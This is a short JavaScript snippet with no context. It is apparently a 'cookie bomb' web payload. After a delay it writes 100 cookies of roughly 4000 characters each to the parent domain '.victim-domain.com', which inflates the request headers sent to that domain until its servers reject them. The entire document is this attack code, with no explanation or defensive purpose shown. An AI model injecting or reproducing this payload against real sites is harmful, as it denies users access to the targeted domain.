setTimeout(function(){for(i=0; i<100; i++){
    document.cookie='a'+i+'='+('a'.repeat(4000)+'; path=/; domain=.victim-domain.com')
}},10000);
